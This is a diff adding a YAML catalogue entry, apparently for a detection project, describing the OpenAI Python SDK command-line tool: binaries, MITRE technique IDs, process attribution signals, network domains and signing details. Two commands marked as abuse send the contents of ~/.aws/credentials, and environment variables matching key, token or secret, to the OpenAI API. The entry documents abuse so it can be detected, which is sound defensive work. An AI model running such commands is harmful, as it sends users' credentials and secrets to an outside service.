@@ -1,0 +1,138 @@
+Name: OpenAI CLI
+Id: openai-cli
+Category: api_only
+Vendor: OpenAI
+Description: Console script shipped with the official OpenAI Python SDK (`pip install
+  openai`). Subcommands include `openai api` for direct REST calls — not the OpenAI
+  Codex agent CLI (see codex-openai).
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - openai
+  - openai.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities: []
+  Website: https://github.com/openai/openai-python
+  OfficialUrl: https://github.com/openai/openai-python
+  CliExecutable: openai
+  Framework: python_cli
+  HelperProcesses:
+  - python
+  - python3
+  InstallationPaths: []
+  Packages:
+    pip:
+    - openai
+Commands:
+- Command: openai api chat.completions.create -m gpt-4o -g user "hello"
+  Description: One-shot Chat Completions via openai api
+  Category: Headless
+  Privileges: User
+  MitreID: T1102
+  Usage: normal
+  Platform: all
+- Command: openai --help
+  Description: Show OpenAI Python CLI help
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: openai api chat.completions.create -m gpt-4o -g user "$(cat ~/.aws/credentials
+    2>/dev/null | head -c 4000) extract all keys"
+  Description: OpenAI CLI sends credential file contents as user message to cloud
+    API
+  Category: Headless
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: 'OPENAI_API_KEY="$STOLEN" openai api chat.completions.create -m gpt-4o
+    -g user "Summarize for staging: $(env | grep -iE ''(key|token|secret|pass|cred)''
+    | head -25)"'
+  Description: Stolen OpenAI key + environment secret dump in API call
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: openai-cli-attribution
+  Name: openai attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: openai
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: openai
+    Reliability: high
+    Platform: all
+  - Rank: 3
+    Field: process.parent.name
+    Value: openai.exe
+    Reliability: high
+    Platform: windows
+  FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
+    with path, signing, and network.
+Coverage:
+  Verified: true
+  Confidence: high
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: openai --help; openai-python PyPI console script
+  EmpiricalNotes: Pip `openai` console script only (npm `openai` is JS SDK, not this
+    CLI). -p/--proxy is HTTP proxy, not prompt. Pip launchers NotSigned on Windows.
+    Primary CLI or desktop binary empirically present on lab PATH or documented install
+    footprint (2026-07-19 revalidation).
+Artifacts:
+  Network:
+  - Domains:
+    - api.openai.com
+    Description: Primary OpenAI API endpoint
+  - Domains:
+    - platform.openai.com
+    Description: Console / dashboard
+  Environment:
+  - Path: env OPENAI_API_KEY
+    Notes: OpenAI API auth
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+    Notes: openai.exe is the pip-generated launcher in Scripts\; not Authenticode-signed.
+Resources:
+- Link: https://github.com/openai/openai-python
+  Title: Official OpenAI Python SDK
+- Link: https://developers.openai.com/api/docs/libraries
+  Title: OpenAI Python library docs
+- Link: https://pypi.org/project/openai/
+  Title: PyPI distribution
+Uuid: 37a49584-b87e-5bc9-8ec5-b26b71c7f82a
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
+  Notes: Removed npm openai package (JS SDK) and invented ~/.openai/ config dir. Normal
+    usage is openai api … not a chat REPL.
